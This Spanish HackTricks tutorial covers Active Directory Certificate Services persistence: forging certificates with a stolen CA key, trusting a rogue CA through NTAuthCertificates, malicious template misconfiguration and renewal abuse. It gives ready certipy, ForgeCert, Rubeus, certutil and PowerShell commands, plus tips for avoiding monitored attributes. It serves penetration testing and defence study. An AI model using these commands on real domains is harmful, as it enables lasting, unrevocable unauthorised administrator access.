# AD CS Persistencia de Dominio

{{#include ../../../banners/hacktricks-training.md}}

**Este es un resumen de las técnicas de persistencia en el dominio compartidas en [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consulta el documento para más detalles.

## Forging Certificates with Stolen CA Certificates (Golden Certificate) - DPERSIST1

¿Cómo puedes saber que un certificado es un certificado CA?

Se puede determinar que un certificado es un certificado CA si se cumplen varias condiciones:

- El certificado está almacenado en el servidor CA, con su clave privada protegida por el DPAPI de la máquina, o por hardware como un TPM/HSM si el sistema operativo lo soporta.
- Los campos Issuer y Subject del certificado coinciden con el nombre distinguido de la CA.
- La extensión "CA Version" está presente exclusivamente en los certificados de CA.
- El certificado carece de campos Extended Key Usage (EKU).

Para extraer la clave privada de este certificado, la herramienta `certsrv.msc` en el servidor CA es el método soportado a través de la GUI integrada. No obstante, este certificado no difiere de otros almacenados en el sistema; por lo tanto, se pueden aplicar métodos como la técnica [THEFT2](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) para su extracción.

El certificado y la clave privada también pueden obtenerse usando Certipy con el siguiente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Al obtener el certificado de la CA y su clave privada en formato `.pfx`, herramientas como [ForgeCert](https://github.com/GhostPack/ForgeCert) se pueden utilizar para generar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> El usuario objetivo para la falsificación de certificados debe estar activo y ser capaz de autenticarse en Active Directory para que el proceso tenga éxito. Falsificar un certificado para cuentas especiales como krbtgt no es eficaz.

Este certificado forjado será **válido** hasta la fecha final especificada y mientras el certificado root de la CA sea válido (normalmente de 5 a **10+ años**). También es válido para **máquinas**, por lo que combinado con **S4U2Self**, un atacante puede **mantener persistencia en cualquier máquina del dominio** mientras el certificado de la CA sea válido.\
Además, los **certificados generados** con este método **no pueden ser revocados** ya que la CA no tiene conocimiento de ellos.

### Operando bajo la Aplicación estricta del mapeo de certificados (2025+)

Desde el 11 de febrero de 2025 (tras el despliegue de KB5014754), los controladores de dominio usan por defecto **Full Enforcement** para los mapeos de certificados. Prácticamente esto significa que tus certificados forjados deben o bien:

- Contener un enlace fuerte con la cuenta objetivo (por ejemplo, la extensión de seguridad SID), o
- Estar emparejado con un mapeo explícito y fuerte en el atributo `altSecurityIdentities` del objeto objetivo.

Un enfoque fiable para la persistencia es emitir un certificado forjado encadenado a la Enterprise CA robada y luego añadir un mapeo explícito y fuerte al principal de la víctima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Si puedes crear certificados forjados que incluyan la extensión de seguridad SID, éstos se mapearán implícitamente incluso bajo Full Enforcement. De lo contrario, prefiere mapeos explícitos y fuertes. See [account-persistence](account-persistence.md) for more on explicit mappings.
- La revocación no ayuda a los defensores aquí: los certificados forjados son desconocidos para la base de datos de la CA y, por tanto, no pueden ser revocados.

#### Forjado compatible con Full-Enforcement (SID-aware)

Herramientas actualizadas permiten incrustar el SID directamente, manteniendo los golden certificates utilizables incluso cuando los DCs rechazan mapeos débiles:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Al incrustar el SID evitas tener que tocar `altSecurityIdentities`, que puede estar monitorizado, a la vez que sigues cumpliendo las comprobaciones de mapeo estrictas.

## Trusting Rogue CA Certificates - DPERSIST2

El objeto `NTAuthCertificates` está diseñado para contener uno o más **CA certificates** dentro de su atributo `cacertificate`, que utiliza Active Directory (AD). El proceso de verificación por parte del **domain controller** implica comprobar el objeto `NTAuthCertificates` en busca de una entrada que coincida con la **CA specified** en el campo Issuer del **certificate** que se está autenticando. La autenticación continúa si se encuentra una coincidencia.

Un certificado CA self-signed puede ser añadido al objeto `NTAuthCertificates` por un atacante, siempre que tenga control sobre este objeto de AD. Normalmente, solo los miembros del grupo **Enterprise Admin**, junto con **Domain Admins** o **Administrators** en el **forest root’s domain**, tienen permiso para modificar este objeto. Pueden editar el objeto `NTAuthCertificates` usando `certutil.exe` con el comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, o empleando la [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionales útiles para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Esta capacidad es especialmente relevante cuando se utiliza en conjunto con un método descrito previamente que involucra ForgeCert para generar certificados de forma dinámica.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Hay abundantes oportunidades para **persistence** mediante **modificaciones de descriptores de seguridad de los componentes de AD CS**. Las modificaciones descritas en la "[Domain Escalation](domain-escalation.md)" section pueden ser implementadas maliciosamente por un atacante con acceso elevado. Esto incluye la adición de "control rights" (por ejemplo, WriteOwner/WriteDACL/etc.) a componentes sensibles como:

- El objeto **AD computer** del servidor CA
- El **RPC/DCOM server** del servidor CA
- Cualquier **descendant AD object or container** en **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por ejemplo, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** por defecto o por la organización (como el grupo incorporado Cert Publishers y cualquiera de sus miembros)

Un ejemplo de implementación maliciosa implicaría que un atacante, que tiene **permisos elevados** en el dominio, añadiera el permiso **`WriteOwner`** a la plantilla de certificado predeterminada **`User`**, siendo el atacante el principal para ese derecho. Para explotar esto, el atacante primero cambiaría la propiedad de la plantilla **`User`** a sí mismo. A continuación, se establecería **`mspki-certificate-name-flag`** a **1** en la plantilla para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitiendo a un usuario incluir un Subject Alternative Name en la solicitud. Posteriormente, el atacante podría **enroll** usando la **plantilla**, eligiendo un nombre de **domain administrator** como nombre alternativo, y utilizar el certificado adquirido para autenticarse como DA.

Configuraciones prácticas que los atacantes pueden establecer para **persistence** a largo plazo en el dominio (ver {{#ref}}domain-escalation.md{{#endref}} para detalles completos y detección):

- Flags de política de la CA que permiten SAN desde los solicitantes (p. ej., habilitando `EDITF_ATTRIBUTESUBJECTALTNAME2`). Esto mantiene explotables rutas similares a ESC1.
- DACL o ajustes de la plantilla que permitan emisión con capacidad de autenticación (p. ej., agregar Client Authentication EKU, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar el objeto `NTAuthCertificates` o los contenedores de la CA para reintroducir continuamente emisores maliciosos si los defensores intentan limpiar.

> [!TIP]
> En entornos reforzados después de KB5014754, emparejar estas configuraciones erróneas con mapeos explícitos y fuertes (`altSecurityIdentities`) garantiza que sus certificados emitidos o forjados sigan siendo utilizables incluso cuando los DCs apliquen el mapeo fuerte.

### Certificate renewal abuse (ESC14) for persistence

Si comprometes un certificado con capacidad de autenticación (o uno de Enrollment Agent), puedes **renovarlo indefinidamente** mientras la plantilla emisora permanezca publicada y tu CA siga confiando en la cadena emisora. La renovación conserva los bindings de identidad originales pero extiende la validez, lo que dificulta la expulsión a menos que se arregle la plantilla o se vuelva a publicar la CA.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Si los controladores de dominio están en **Full Enforcement**, añade `-sid <victim SID>` (o usa una plantilla que todavía incluya la extensión de seguridad SID) para que el certificado leaf renovado continúe mapeando fuertemente sin tocar `altSecurityIdentities`. Los atacantes con derechos de administrador de CA también pueden ajustar `policy\RenewalValidityPeriodUnits` para alargar la validez de las renovaciones antes de emitir ellos mismos un certificado.

## References

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
